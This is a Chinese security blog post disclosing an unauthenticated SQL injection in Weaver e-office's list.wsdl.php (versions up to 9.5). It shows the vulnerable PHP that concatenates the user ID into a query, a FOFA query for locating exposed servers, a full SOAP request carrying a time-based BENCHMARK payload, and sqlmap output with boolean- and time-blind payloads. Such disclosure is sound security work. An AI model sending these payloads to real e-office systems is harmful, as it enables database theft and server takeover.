---
title: "泛微e-office list.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-list-wsdl-sqli.html
asset_dir: assets/泛微e-office-list.wsdl.php-sql注入漏洞
---

# 泛微e-office list.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/20 08:30
- 754浏览
- [0评论](#comment)
- 35分钟阅读

深入探索

Web安全课程

漏洞扫描服务

传输层安全性协议

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office list.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

深入探索

安全

Web安全书籍

恶意软件分析工具

[![泛微e-office list.wsdl.php sql注入漏洞](images/img-001-21ce529b96e7.webp)](https://image.mrxn.net/c2e5296623fd4123a1feef0c4617a5d6.webp)

webservice-json/workflow/list.wsdl.php 的 `GetMyCreatFlow` 业务逻辑如下

漏洞预警服务

```
function GetMyCreatFlow( $UserId )
{
    checkcurrentsession( );
    $FlowList = new listItem( );
    $UserInfo = array( );
    $DepyId = getuserdept( $UserId );
    $PrivId = getuserprivid( $UserId );
    $UserInfo['UserId'] = $UserId;
    $UserInfo['DepyId'] = $DepyId;
    $UserInfo['PrivId'] = $PrivId;
    $result = $FlowList->GetMyCreatFlow( $UserInfo );
    $Infor = array( );
```

`$UserId` 首先带入 `getuserdept` 函数

```
function getUserDept( $userid )
{
    global $connection;
    $dept_id = -1;
    $query = "SELECT DEPT_ID FROM user WHERE USER_ID = '".$userid."'";
    $rs = exequery( $connection, $query );
    if ( $rows = mysql_fetch_array( $rs ) )
    {
        $dept_id = $rows['DEPT_ID'];
    }
    return $dept_id;
}
```

`$userid` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/workflow/list.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:ListServicewsdl#GetMyCreatFlow
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ListServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetMyCreatFlow soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">gero' AND 2262=BENCHMARK(5000000,MD5(0x41597a64))-- Ilcs</UserId>
      </urn:GetMyCreatFlow>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office list.wsdl.php sql注入漏洞](images/img-002-2770503f36d7.webp)](https://image.mrxn.net/6bf5c6a72b7e485389b68bcfc6c452d6.webp)

成功在延时 10 秒（因为还会进入 getUserPrivId 函数，总共执行两次）

软件

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 320 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ListServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetMyCreatFlow soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">-7491' OR 4428=4428#</UserId>
      </urn:GetMyCreatFlow>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ListServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetMyCreatFlow soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">gero' AND 2262=BENCHMARK(5000000,MD5(0x41597a64))-- Ilcs</UserId>
      </urn:GetMyCreatFlow>
   </soapenv:Body>
</soapenv:Envelope>
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
